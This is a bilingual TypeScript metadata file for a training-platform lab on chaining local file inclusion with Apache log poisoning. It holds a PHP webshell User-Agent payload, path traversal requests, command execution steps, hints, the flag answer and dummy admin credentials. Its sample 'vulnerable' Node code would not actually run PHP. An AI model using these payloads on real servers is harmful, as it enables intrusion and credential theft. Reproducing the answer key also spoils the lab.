// src/modules/practice-labs/file-inclusion/labs/lab3/lab3.metadata.ts
import type { LabMetadata } from '../../../types/lab-metadata.type';

export const lfiLab3Metadata: LabMetadata = {
  slug: 'lfi-log-poisoning-apache-rce',
  title: 'File Inclusion: LFI to Log Poisoning — Apache Access Log RCE',
  ar_title: 'تضمين الملفات: LFI إلى تسميم السجلات — RCE عبر Apache Access Log',
  description:
    'Chain a Local File Inclusion vulnerability with Apache log poisoning to achieve Remote Code Execution. First poison the Apache access log by injecting PHP code into the User-Agent header, then use LFI to include the poisoned log file — triggering execution of the injected PHP code.',
  ar_description:
    'سلسل ثغرة LFI مع تسميم سجلات Apache لتحقيق RCE. أولاً سمّم سجل Apache access.log بحقن كود PHP في User-Agent header، ثم استخدم LFI لتضمين ملف السجل المسموم — مما يُطلق تنفيذ كود PHP المحقون.',
  difficulty: 'INTERMEDIATE',
  category: 'WEB_SECURITY',
  skills: [
    'LFI to RCE',
    'Log Poisoning',
    'PHP Code Injection',
    'Apache Log Abuse',
    'Chained Exploitation',
  ],
  xpReward: 300,
  pointsReward: 150,
  duration: 55,
  executionMode: 'SHARED_BACKEND',
  isPublished: true,

  // ─── للمتدرب ────────────────────────────────────────────────────
  goal: 'Step 1: Send a request with User-Agent: "<?php system($_GET[\'cmd\']); ?>" to poison the access log. Step 2: Use LFI to include /var/log/apache2/access.log with cmd=cat /var/www/html/secret.txt to execute the injected PHP and read the flag.',
  ar_goal:
    'الخطوة 1: أرسل طلباً مع User-Agent: "<?php system($_GET[\'cmd\']); ?>" لتسميم سجل الوصول. الخطوة 2: استخدم LFI لتضمين /var/log/apache2/access.log مع cmd=cat /var/www/html/secret.txt لتنفيذ PHP المحقون وقراءة العلم.',

  briefing: {
    en: `ViewerX web application. Content management. File viewer.
GET /view?page=home — loads home.html.
GET /view?page=about — loads about.html.
The server reads: /var/www/html/pages/ + page.
You know LFI works.
GET /view?page=../../../../etc/passwd → /etc/passwd.
But the flag isn't in /etc/passwd.
Where is executable code written to disk?
Logs.
Apache writes every request to /var/log/apache2/access.log.
The format: IP - - [date] "METHOD PATH HTTP" STATUS SIZE "USER-AGENT"
The User-Agent. Written directly. No escaping.
What if your User-Agent was: <?php system($_GET['cmd']); ?>
Apache writes it to the log.
The log now contains PHP code.
The log is a text file. On disk. With PHP code inside.
You know LFI. You know where the log is.
GET /view?page=../../../../var/log/apache2/access.log&cmd=id
The server includes the log. PHP executes.
system("id") runs.
uid=33(www-data) gid=33(www-data)
You have a webshell. From a log file.`,
    ar: `تطبيق ويب ViewerX. إدارة محتوى. عارض ملفات.
GET /view?page=home — يحمّل home.html.
GET /view?page=about — يحمّل about.html.
الخادم يقرأ: /var/www/html/pages/ + page.
تعرف أن LFI يعمل.
GET /view?page=../../../../etc/passwd → /etc/passwd.
لكن العلم ليس في /etc/passwd.
أين يُكتَب الكود القابل للتنفيذ على القرص؟
السجلات.
Apache يكتب كل طلب في /var/log/apache2/access.log.
الصيغة: IP - - [date] "METHOD PATH HTTP" STATUS SIZE "USER-AGENT"
الـ User-Agent. مكتوب مباشرة. بدون escape.
ماذا لو كان User-Agent لديك: <?php system($_GET['cmd']); ?>
Apache يكتبه في السجل.
السجل الآن يحتوي على كود PHP.
السجل ملف نصي. على القرص. بداخله كود PHP.
تعرف LFI. تعرف أين السجل.
GET /view?page=../../../../var/log/apache2/access.log&cmd=id
الخادم يُدرج السجل. PHP تُنفَّذ.
system("id") يعمل.
uid=33(www-data) gid=33(www-data)
لديك webshell. من ملف سجل.`,
  },

  stepsOverview: {
    en: [
      'Confirm LFI: GET /view?page=../../../../etc/passwd → /etc/passwd contents returned',
      'Poison the log: POST /log/poison { "userAgent": "<?php system($_GET[\'cmd\']); ?>" } → PHP code written to access.log',
      'Verify poison: GET /lfi/read-log → confirm PHP code is now in access.log',
      'Trigger RCE: POST /page/view { "page": "../../../../var/log/apache2/access.log", "cmd": "id" } → "uid=33(www-data)"',
      'Read flag: { "cmd": "cat /var/www/html/secret.txt" } → FLAG{LFI_LOG_POISONING_APACHE_RCE_PHP_INJECTION}',
    ],
    ar: [
      'أكّد LFI: GET /view?page=../../../../etc/passwd → محتويات /etc/passwd مُعادة',
      'سمّم السجل: POST /log/poison { "userAgent": "<?php system($_GET[\'cmd\']); ?>" } → كود PHP مكتوب في access.log',
      'تحقق من التسميم: GET /lfi/read-log → أكّد أن كود PHP موجود الآن في access.log',
      'أطلق RCE: POST /page/view { "page": "../../../../var/log/apache2/access.log"، "cmd": "id" } → "uid=33(www-data)"',
      'اقرأ العلم: { "cmd": "cat /var/www/html/secret.txt" } → FLAG{LFI_LOG_POISONING_APACHE_RCE_PHP_INJECTION}',
    ],
  },

  // ─── للأدمن فقط ─────────────────────────────────────────────────
  solution: {
    context:
      'ViewerX /view?page= has LFI: reads /var/www/html/pages/ + page. Apache logs User-Agent verbatim to /var/log/apache2/access.log. Injecting PHP into User-Agent writes executable code to the log. LFI of the log file causes PHP to execute the injected code. The cmd GET parameter is passed to system() — full RCE. secret.txt contains the flag.',
    vulnerableCode:
      '// Step 1: Poison the log\n' +
      "// Request with: User-Agent: <?php system($_GET['cmd']); ?>\n" +
      '// Apache writes to access.log:\n' +
      '// 192.168.1.1 - - [date] "GET / HTTP/1.1" 200 - "<?php system($_GET[\'cmd\']); ?>"\n\n' +
      '// Step 2: Trigger LFI with the poisoned log\n' +
      "app.get('/view', isAuthenticated, (req, res) => {\n" +
      '  const page = req.query.page;\n' +
      '  // ❌ LFI — includes the log file which contains injected PHP!\n' +
      "  const content = fs.readFileSync('/var/www/html/pages/' + page);\n" +
      '  res.send(content); // PHP gets executed\n' +
      '});',
    exploitation:
      '1. POST /log/poison { "userAgent": "<?php system($_GET[\'cmd\']); ?>" } → log poisoned\n' +
      '2. POST /page/view { "page": "../../../../var/log/apache2/access.log", "cmd": "cat /var/www/html/secret.txt" }\n' +
      '→ PHP executes → secret.txt contents returned → FLAG',
    steps: {
      en: [
        'POST /log/poison { "userAgent": "<?php system($_GET[\'cmd\']); ?>" } → { "success": true, "message": "User-Agent written to access.log" }',
        'GET /lfi/read-log → access.log now contains "<?php system($_GET[\'cmd\']); ?>" in a log entry',
        'POST /page/view { "page": "../../../../var/log/apache2/access.log", "cmd": "id" } → "uid=33(www-data) gid=33(www-data)" — RCE confirmed',
        'POST /page/view { "page": "../../../../var/log/apache2/access.log", "cmd": "cat /var/www/html/secret.txt" } → FLAG{LFI_LOG_POISONING_APACHE_RCE_PHP_INJECTION}',
      ],
      ar: [
        'POST /log/poison { "userAgent": "<?php system($_GET[\'cmd\']); ?>" } → { "success": true، "message": "User-Agent مكتوب في access.log" }',
        'GET /lfi/read-log → access.log يحتوي الآن على "<?php system($_GET[\'cmd\']); ?>" في إدخال سجل',
        'POST /page/view { "page": "../../../../var/log/apache2/access.log"، "cmd": "id" } → "uid=33(www-data) gid=33(www-data)" — تأكيد RCE',
        'POST /page/view { "page": "../../../../var/log/apache2/access.log"، "cmd": "cat /var/www/html/secret.txt" } → FLAG{LFI_LOG_POISONING_APACHE_RCE_PHP_INJECTION}',
      ],
    },
    fix: [
      'Fix the LFI first: allowlist page names — the log poisoning only works because LFI exists',
      'Log sanitization: strip or HTML-encode PHP tags from logged strings — never write raw User-Agent to logs without escaping',
      'Restrict LFI path: even if LFI exists, logs directory should be outside the web root and not in accessible paths',
      'Log rotation + permissions: /var/log/apache2/ should not be readable by the www-data process',
    ],
  },

  postSolve: {
    explanation: {
      en: 'Log poisoning is a chained attack: LFI + writable/readable log = RCE. The key insight is that log files aggregate data from many sources — User-Agent, Referer, request paths — and typically log raw strings without sanitization. When a server includes a log file (via LFI) and the runtime (PHP) processes that file, any code in the log gets executed. This technique generalizes to any file the attacker can write to AND the server can include: /tmp/sess_* session files, mail logs, error logs, SSH auth logs.',
      ar: 'تسميم السجلات هو هجوم متسلسل: LFI + سجل قابل للكتابة/القراءة = RCE. الفكرة الأساسية هي أن ملفات السجلات تجمع بيانات من مصادر عديدة — User-Agent، Referer، مسارات الطلبات — وعادةً تسجّل سلاسل خام بدون تعقيم. عندما يُدرج خادم ملف سجل (عبر LFI) ويُعالج الـ runtime (PHP) هذا الملف، يُنفَّذ أي كود في السجل. تتعمّم هذه التقنية لأي ملف يستطيع المهاجم الكتابة إليه والخادم تضمينه: ملفات /tmp/sess_* للجلسات، سجلات البريد، سجلات الأخطاء، سجلات SSH auth.',
    },
    impact: {
      en: 'Full RCE from a two-step attack chain. secret.txt contains admin credentials for the admin panel, the admin password, and the FLAG. With www-data shell access, the attacker can: read all web application files, access the database (credentials from config files), establish persistence via cron jobs or .htaccess modification, and pivot to internal network services.',
      ar: 'RCE كامل من سلسلة هجوم من خطوتين. يحتوي secret.txt على بيانات اعتماد المسؤول للوحة التحكم، كلمة مرور المسؤول، والـ FLAG. مع وصول www-data shell، يستطيع المهاجم: قراءة جميع ملفات تطبيق الويب، الوصول لقاعدة البيانات (بيانات الاعتماد من ملفات الإعداد)، إنشاء persistence عبر cron jobs أو تعديل .htaccess، والتمحور إلى خدمات الشبكة الداخلية.',
    },
    fix: [
      'Primary: fix the LFI — without LFI, the poisoned log is just a text file that never executes',
      'Log sanitization: htmlspecialchars() or strip_tags() on all user-controlled values before logging',
      'Separate log permissions: /var/log/apache2/ chmod 640 root:adm — www-data cannot read it',
      'WAF rule: block requests with PHP tags in User-Agent, Referer, or other logged headers',
    ],
  },

  hints: [
    {
      order: 1,
      xpCost: 20,
      content:
        'Apache logs every request including the User-Agent header to /var/log/apache2/access.log. The User-Agent is logged as raw text — no sanitization. What if you put PHP code in your User-Agent?',
    },
    {
      order: 2,
      xpCost: 40,
      content:
        'Use POST /log/poison to inject PHP into the access log User-Agent: { "userAgent": "<?php system($_GET[\'cmd\']); ?>" }. Then use LFI to include the log file — the server will execute the PHP code written in it.',
    },
    {
      order: 3,
      xpCost: 65,
      content:
        'Step 1: POST /log/poison { "userAgent": "<?php system($_GET[\'cmd\']); ?>" }\nStep 2: POST /page/view { "page": "../../../../var/log/apache2/access.log", "cmd": "id" } — do you see "www-data" in the output?',
    },
    {
      order: 4,
      xpCost: 90,
      content:
        'After confirming RCE via id, use cmd=cat /var/www/html/secret.txt to read the flag file. The PHP code in the log will execute the command and return its output in the response.',
    },
  ],

  flagAnswer: 'FLAG{LFI_LOG_POISONING_APACHE_RCE_PHP_INJECTION}',
  initialState: {
    contents: [
      {
        title: 'SECRET_TXT',
        body: 'Server Admin Credentials\n========================\nAdmin Panel: https://viewerx-admin.io/panel\nUsername: admin@viewerx.io\nPassword: V13w3rX_ADM1N_2024!\n\nFLAG: FLAG{LFI_LOG_POISONING_APACHE_RCE_PHP_INJECTION}',
        author: 'system_file',
        isPublic: false,
      },
      {
        title: 'ACCESS_LOG_INITIAL',
        body: '192.168.1.100 - - [05/Mar/2026:20:00:01 +0000] "GET / HTTP/1.1" 200 2326 "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"\n192.168.1.101 - - [05/Mar/2026:20:01:15 +0000] "GET /about HTTP/1.1" 200 1024 "Mozilla/5.0 (X11; Linux x86_64)"\n192.168.1.102 - - [05/Mar/2026:20:02:33 +0000] "POST /login HTTP/1.1" 302 - "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"',
        author: 'apache_log',
        isPublic: false,
      },
    ],
  },
};
